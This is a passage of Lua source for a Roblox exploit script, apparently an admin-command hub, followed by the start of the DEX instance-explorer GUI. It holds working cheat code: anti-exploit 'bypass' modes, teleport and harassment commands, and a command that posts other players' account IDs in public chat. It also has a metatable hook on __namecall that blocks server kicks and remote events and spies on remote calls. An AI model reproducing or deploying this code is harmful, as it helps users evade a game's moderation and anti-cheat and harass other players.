        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
        wait(4)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
        wait(3)
        chattingerror = true
    end
end

spawnpos = nil
spawningpos = true
Commands.spawnpoint = function(args)
    spawnpos = LP.Character.HumanoidRootPart.CFrame
    spawningpos = true
    Notification("info", "Spawn point has been set! Use "..commandPrefix.."nospawn to remove.", 6)
end

Commands.nospawn = function(args)
    spawningpos = false
    Notification("info", "Spawn point has been removed. Use "..commandPrefix.."spawnpoint to enable.", 6)
end

Commands.bypass = function(args)
    if args[1] then
        if string.lower(tostring(args[1])) == "on" then
            bypassMODE = true
            Notification("warning", "Bypass mode turned on, this changes functions of "..commandPrefix.."fly and other commands to bypass most anti-exploits.", 7)
        elseif string.lower(tostring(args[1])) == "off" then
            bypassMODE = false
            Notification("warning", "Bypass mode has been turned off.", 7)
        end
    end
end

Commands.fixcam = function(args)
    gsWorkspace.CurrentCamera:Destroy()
    wait(0.1)
    game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character.Humanoid
    game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
    LP.CameraMinZoomDistance = 0.5
    LP.CameraMaxZoomDistance = 400
    LP.CameraMode = "Classic"
    LP.DevCameraOcclusionMode = CurrentNormal
end

Commands.gotoobj = function(args)
    if args[1] then
        for i,v in pairs(gsWorkspace:GetDescendants()) do
            if string.lower(v.Name) == string.lower(tostring(args[1])) then
                LP.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end
end

Commands.breakcam = function(args)
    gsWorkspace.CurrentCamera.CameraSubject = LP.Character.Head
end

Commands.inviscam = function(args)
    LP.DevCameraOcclusionMode = "Invisicam"
end

printobjKEY = ""
printobjCLICKING = false
printobjACTIVE = false

Commands.printobj = function(args)
    if args[1] then
        printobjKEY = string.sub(tostring(args[1]), 1, 1)
        printobjACTIVE = true
        printobjCLICKING = false
    else
        printobjKEY = ""
        printobjACTIVE = true
        printobjCLICKING = true
    end
end

Mouse.KeyDown:Connect(function(key) 
    if key == printobjKEY and printobjACTIVE == true then 
        if Mouse.Target then
            local path = Mouse.Target:GetFullName()
            local getPath = "game:GetService(\"Workspace\")"
            local getSpaces = ""
            local separate = {}
            local a = nil
            for v in string.gmatch(string.sub(path, 10), "[^.]+") do
                if string.match(v, " ") then
                    a = "["..v.."]"
                    table.insert(separate, a)
                else
                    a = "."..v
                    table.insert(separate, a)
                end
                getSpaces = table.concat(separate, "")
            end
            local fullPath = getPath..getSpaces
            print(fullPath)
        end 
    end
end)
Mouse.Button1Down:Connect(function()
    if printobjCLICKING == true and printobjACTIVE == true then
        if Mouse.Target then 
            local path = Mouse.Target:GetFullName()
            local getPath = "game:GetService(\"Workspace\")"
            local getSpaces = ""
            local separate = {}
            local a = nil
            for v in string.gmatch(string.sub(path, 10), "[^.]+") do
                if string.match(v, " ") then
                    a = "["..v.."]"
                    table.insert(separate, a)
                else
                    a = "."..v
                    table.insert(separate, a)
                end
                getSpaces = table.concat(separate, "")
            end
            local fullPath = getPath..getSpaces
            print(fullPath)
        end 
    end
end)

Commands.unprintobj = function(args)
    printobjACTIVE = false
    printobjCLICKING = false
end

Commands.hotkeyfc = function(args)
    if args[1] then
        if string.lower(tostring(args[1])) == "goto" then
            fchotkeymode = "goto"
        elseif string.lower(tostring(args[1])) == "unfc" then
            fchotkeymode = "unfc"
        end
        fullUpdate()
    end
end

Commands.carpet = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            if v ~= nil then
                annoying = true
                annplr = v
                local carpetAnimation = Instance.new("Animation")
                carpetAnimation.AnimationId = "rbxassetid://282574440"
                carpetTrack = LP.Character.Humanoid:LoadAnimation(carpetAnimation)
                carpetTrack:Play(.1, 1, 1)
            end
        end
    end
end

Commands.uncarpet = function(args)
    annoying = false
    carpetTrack:Stop()
end

Commands.brickcreate = function(args)
    if args[1] then
        local createPosition = LP.Character.HumanoidRootPart.CFrame
        if args[2] and args[3] and args[4] then
            createPosition = CFrame.new(Vector3.new(args[2], args[3], args[4]))
        else
            createPosition = LP.Character.HumanoidRootPart.CFrame
        end
        for i = 1, args[1] do
            LP.Character.HumanoidRootPart.CFrame = createPosition
            run(commandPrefix.."blockhats")
            wait(0.2)
            run(commandPrefix.."drophats")
            wait(0.2)
            run(commandPrefix.."reset")
            wait(6)
        end
    end
end

Commands.forward = function(args)
    if args[1] then
        forwardSpeed = args[1]
    else
        forwardSpeed = 1
    end
    cmdForward = true
end

Commands.unforward = function(args)
    cmdForward = false
end

Commands.id = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." Account ID: "..v.UserId.."!", "All")
        end
    end
end

Commands.spinhats = function(args) -- Credit to xFunnieuss
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Accessory") or v:IsA("Hat") then
            local keep = Instance.new("BodyPosition") keep.Parent = v.Handle keep.Name = "no"
            local spin = Instance.new("BodyAngularVelocity") spin.Parent = v.Handle spin.Name = "ha"
            if v.Handle.AccessoryWeld then
                v.Handle.AccessoryWeld:Destroy()
            end
            if args[1] then
                spin.AngularVelocity = Vector3.new(0, args[1], 0)
                spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
            else
                spin.AngularVelocity = Vector3.new(0, 100, 0)
                spin.MaxTorque = Vector3.new(0, 200, 0)
            end
            keep.P = 30000
            keep.D = 50
            spinObj = keep
            spinTOhead = true
        end
    end
end

Commands.unspinhats = function(args)
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Accessory") or v:IsA("Hat") then
            pcall(function()
                run(commandPrefix.."drophats")
                wait(2)
                v.Handle.spin:Destroy()
                v.Handle.keep:Destroy()
            end)
        end
    end
end

-- findPlayer function (ALL, OTHERS, ME, NOOBS, VETERANS, OLDVETERANS, FRIENDS, NOFRIENDS, DEFAULT, RANDOM, SAMETEAM, NOTEAM, OTHERTEAM, TEAMname)
function findPlayer(plr)
    local players = {}
    local find = plr:lower()
    local getAllNames = getmultipleplayers(find)
    for i,mplr in pairs(getAllNames) do
    if mplr == "all" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            table.insert(players,v)
        end
    elseif mplr == "others" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if v.Name ~= LP.Name then
                table.insert(players,v)
            end
        end 
    elseif mplr == "me" then
        table.insert(players,LP)
    elseif mplr == "noobs" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if v.AccountAge <= 3 then
                table.insert(players,v)
            end
        end
    elseif mplr == "veterans" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if v.AccountAge >= 365 then
                table.insert(players,v)
            end
        end
    elseif mplr == "oldveterans" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if v.AccountAge >= 1500 then
                table.insert(players,v)
            end
        end
    elseif mplr == "friends" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if v:IsFriendsWith(LP.UserId) and v.Name ~= LP.Name then
                table.insert(players,v)
            end
        end
    elseif mplr == "nofriends" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if not v:IsFriendsWith(LP.UserId) and v.Name ~= LP.Name then
                table.insert(players,v)
            end
        end
    elseif mplr == "default" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if v.Character:FindFirstChild("Pal Hair") or v.Character:FindFirstChild("Kate Hair") then
                table.insert(players,v)
            end
        end
    elseif mplr == "random" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            table.insert(players,v[math.random(1, #v)])
        end
    elseif mplr == "sameteam" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if v.Team == LP.Team then
                table.insert(players,v)
            end
        end
    elseif mplr == "noteam" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if v.Team == nil then
                table.insert(players,v)
            end
        end
    elseif mplr == "otherteam" then
            for i,v in pairs(gsPlayers:GetPlayers()) do
                if v.Team ~= LP.Team then
                    table.insert(players,v)
                end
            end
    elseif string.sub(mplr, 1, 4) == "team" then
            for i,v in pairs(gsPlayers:GetPlayers()) do
                if string.lower(tostring(v.Team)) == string.sub(mplr, 5) then
                    if v ~= nil then
                        table.insert(players,v)
                    else
                        if string.lower(tostring(v.Team)) == string.gsub(string.sub(mplr, 5), "[^_]+", " ") then
                            table.insert(players,v)
                        end
                    end
                end
            end 
        else
            for i,v in pairs(gsPlayers:GetPlayers()) do
                if string.lower(v.Name):sub(1, #mplr) == string.lower(mplr) then
                    table.insert(players,v)
                end
            end
        end
    end

    return players    
end
function getmultipleplayers(plr)
    local plrsgotten = {}
    for i in string.gmatch(plr,"[^,]+") do
        table.insert(plrsgotten,i)
    end
    return plrsgotten
end
function findSinglePlayer(plr)
    local players = {}
    local find = plr:lower()
    if find == "me" then
        table.insert(players,LP)
    else
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if string.lower(v.Name):sub(1, #find) == string.lower(find) then
                table.insert(players,v)
            end
        end
    end
    local oneplayer = {}
    pcall(function()
        table.insert(oneplayer, players[math.random(1, #players)])
    end)
    return oneplayer
end

-- Anti Kick

if getrawmetatable then
    function formatargs(getArgs,v)
        if #getArgs == 0 then 
            return "" 
        end
        
        local collectArgs = {}
        for k,v in next,getArgs do
            local argument = ""
            if type(v) == "string" then
                argument = "\""..v.."\""
            elseif type(v) == "table" then
                argument = "{" .. formatargs(v,true) .. "}"
            else
                argument = tostring(v)
            end
            if v and type(k) ~= "number" then
                table.insert(collectArgs,k.."="..argument)
            else
                table.insert(collectArgs,argument)
            end
        end
        return table.concat(collectArgs, ", ")
    end
    
    kicknum = 0
    local game_meta = getrawmetatable(game)
    local game_namecall = game_meta.__namecall
    local game_index = game_meta.__index
    local w = (setreadonly or fullaccess or make_writeable)
    pcall(w, game_meta, false)
    game_meta.__namecall = function(out, ...)
        local args = {...}
        local Method = args[#args]
        args[#args] = nil
        
        if Method == "Kick" and out == LP then
            kicknum = kicknum + 1
            warn("Blocked client-kick attempt "..kicknum)
            return
        end
        
        if antiremotes then
            if Method == "FireServer" or Method == "InvokeServer" then
                if out.Name ~= "CharacterSoundEvent" and out.Name ~= "SayMessageRequest" and out.Name ~= "AddCharacterLoadedEvent" and out.Name ~= "RemoveCharacterEvent" and out.Name ~= "DefaultServerSoundEvent" and out.Parent ~= "DefaultChatSystemChatEvents" then
                    warn("Blocked remote: "..out.Name.." // Method: "..Method)
                    return
                end
            end
        else
            if Method == "FireServer" or Method == "InvokeServer" then
                for i,noremote in pairs(blockedremotes) do
                    if out.Name == noremote and out.Name ~= "SayMessageRequest" then
                        warn("Blocked remote: "..out.Name.." // Method: "..Method)
                        return
                    end
                end
            end
        end
        
        if spyingremotes then
            if Method == "FireServer" or Method == "InvokeServer" then
                if out.Name ~= "CharacterSoundEvent" and out.Name ~= "AddCharacterLoadedEvent" and out.Name ~= "RemoveCharacterEvent" and out.Name ~= "DefaultServerSoundEvent" and out.Name ~= "SayMessageRequest" then
                    local arguments = {}
                    for i = 1,#args do
                        arguments[i] = args[i]
                    end
                    local getScript = getfenv(2).script
                    if getScript == nil then
                        getScript = "??? (Not Found) ???"
                    end
                    warn("<> <> <> A "..out.ClassName.." has been fired! How to fire:\ngame."..out:GetFullName()..":"..Method.."("..formatargs(arguments)..")\n\nFired from script: ".. tostring(getScript:GetFullName()))
                end
            end
        end
        
        return game_namecall(out, ...)
    end
end

-- FE Check
function FEcheckDefault()
    if gsWorkspace.FilteringEnabled == true then
        createIntro("warning", "FE is enabled! Press "..commandPrefix.." to bring Command Bar.", 7)
    else
        createIntro("warning", "FE is disabled. Consider using a different script.", 7)
    end
end
FEcheckDefault()
end)

DexV4Btn.MouseButton1Down:Connect(function()
--[[
	DEX Main Script
	
	Created by: Moon and Courtney
	
	RASPBERRY PI IS A SKIDDY SKID AF
--]]

-- Metas
local Services = setmetatable({},{
	__index = function(self, ind)
		if ypcall(function()game:GetService(ind)end) then
			return game:GetService(ind)
		else
			return nil
		end
	end
})

function CreateInstance(cls,props)
	local inst = Instance.new(cls)
	for i,v in pairs(props) do
		inst[i] = v
	end
	return inst
end

function createDexGui()
	local DexGui = CreateInstance("ScreenGui",{DisplayOrder=0,Enabled=true,ResetOnSpawn=true,Name="Dex",})
	local DexGui2 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.39215689897537,0.39215689897537,0.39215689897537),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-300,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,300,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="ContentFrameR",Parent = DexGui})
	local DexGui3 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.39215689897537,0.39215689897537,0.39215689897537),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,-300,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,300,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="ContentFrameL",Parent = DexGui})
	local DexGui4 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.11764706671238,0.11764706671238,0.11764706671238),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.5,-150,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,300,0,36),SizeConstraint=0,Visible=false,ZIndex=10,Name="TopMenu",Parent = DexGui})
	local DexGui5 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="1.1.0",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=2,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,16),Rotation=0,Selectable=false,Size=UDim2.new(0,30,0,18),SizeConstraint=0,Visible=true,ZIndex=10,Name="Version",Parent = DexGui4})
	local DexGui6 = CreateInstance("ImageLabel",{Image="rbxassetid://474172996",ImageColor3=Color3.new(0.11764706671238,0.11764706671238,0.11764706671238),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-9,0,9),Rotation=90,Selectable=false,Size=UDim2.new(0,36,0,18),SizeConstraint=0,Visible=true,ZIndex=10,Name="Slant",Parent = DexGui4})
	local DexGui7 = CreateInstance("TextLabel",{Font=4,FontSize=5,Text="DEX",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=2,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,2),Rotation=0,Selectable=false,Size=UDim2.new(0,30,0,18),SizeConstraint=0,Visible=true,ZIndex=10,Name="Title",Parent = DexGui4})
	local DexGui8 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,120,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,120,1,0),SizeConstraint=0,Visible=true,ZIndex=10,Name="Content",Parent = DexGui4})
	local DexGui9 = CreateInstance("TextButton",{Font=3,FontSize=7,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=24,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=false,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.039215687662363,0.039215687662363,0.039215687662363),BackgroundTransparency=0,BorderColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,30,0,4),Rotation=0,Selectable=true,Size=UDim2.new(0,112,0,28),SizeConstraint=0,Visible=true,ZIndex=10,Name="SlideSelect",Parent = DexGui4})
	local DexGui10 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Window Views",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,20,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-28,0,28),SizeConstraint=0,Visible=true,ZIndex=10,Name="SlideName",Parent = DexGui9})
	local DexGui11 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="V",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=2,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.11764706671238,0.11764706671238,0.11764706671238),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-8,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,8,0,28),SizeConstraint=0,Visible=true,ZIndex=10,Name="DropDown",Parent = DexGui9})
	local DexGui12 = CreateInstance("ImageLabel",{Image="rbxassetid://588745174",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,6),Rotation=0,Selectable=false,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=true,ZIndex=10,Name="Icon",Parent = DexGui9})
	local DexGui13 = CreateInstance("ImageLabel",{Image="rbxassetid://474172996",ImageColor3=Color3.new(0.11764706671238,0.11764706671238,0.11764706671238),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,-18,0,0),Rotation=180,Selectable=false,Size=UDim2.new(0,18,0,36),SizeConstraint=0,Visible=true,ZIndex=10,Name="Slant",Parent = DexGui4})
	local DexGui14 = CreateInstance("TextButton",{Font=3,FontSize=7,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=24,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=false,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-30,0,0),Rotation=0,Selectable=true,Size=UDim2.new(0,30,0,36),SizeConstraint=0,Visible=true,ZIndex=10,Name="About",Parent = DexGui4})
	local DexGui15 = CreateInstance("ImageLabel",{Image="rbxassetid://476354004",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,3,0,6),Rotation=0,Selectable=false,Size=UDim2.new(0,24,0,24),SizeConstraint=0,Visible=true,ZIndex=10,Name="Icon",Parent = DexGui14})
	local DexGui16 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,100,0,100),SizeConstraint=0,Visible=false,ZIndex=1,Name="Resources",Parent = DexGui})
	local DexGui17 = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=false,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.37647062540054,0.54901963472366,0.82745105028152),BackgroundTransparency=1,BorderColor3=Color3.new(0.33725491166115,0.49019610881805,0.73725491762161),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,1,0,2),Rotation=0,Selectable=true,Size=UDim2.new(1,-18,0,18),SizeConstraint=0,Visible=true,ZIndex=1,Name="Entry",Parent = DexGui16})
	local DexGui18 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=1,BorderColor3=Color3.new(0.14509804546833,0.20784315466881,0.21176472306252),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,18,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-18,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Indent",Parent = DexGui17})
	local DexGui19 = CreateInstance("ImageButton",{Image="",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,-16,0.5,-8),Rotation=0,Selectable=true,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=true,ZIndex=1,Name="Expand",Parent = DexGui18})
	local DexGui20 = CreateInstance("ImageLabel",{Image="rbxassetid://529659138",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(-12.562000274658,0,-12.562000274658,0),Rotation=0,Selectable=false,Size=UDim2.new(16,0,16,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Icon",Parent = DexGui19})
	local DexGui21 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Item",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,22,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-22,0,18),SizeConstraint=0,Visible=true,ZIndex=1,Name="EntryName",Parent = DexGui18})
	local DexGui22 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,2,0.5,-8),Rotation=0,Selectable=false,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=true,ZIndex=1,Name="IconFrame",Parent = DexGui18})
	local DexGui23 = CreateInstance("ImageLabel",{Image="rbxassetid://529659138",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(-5.811999797821,0,-1.3120000362396,0),Rotation=0,Selectable=false,Size=UDim2.new(16,0,16,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Icon",Parent = DexGui22})
	local DexGui24 = CreateInstance("Folder",{Name="PropControls",Parent = DexGui16})
	local DexGui25 = CreateInstance("TextBox",{ClearTextOnFocus=true,Font=3,FontSize=5,MultiLine=false,Text="0",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,0),Rotation=0,Selectable=true,Size=UDim2.new(1,-4,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="String",Parent = DexGui24})
	local DexGui26 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.56470590829849,0.56470590829849,0.56470590829849),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-4,1,0),SizeConstraint=0,Visible=false,ZIndex=1,Name="ReadOnly",Parent = DexGui25})
	local DexGui27 = CreateInstance("TextBox",{ClearTextOnFocus=true,Font=3,FontSize=5,MultiLine=false,Text="0",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,0),Rotation=0,Selectable=true,Size=UDim2.new(1,-2,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Number",Parent = DexGui24})
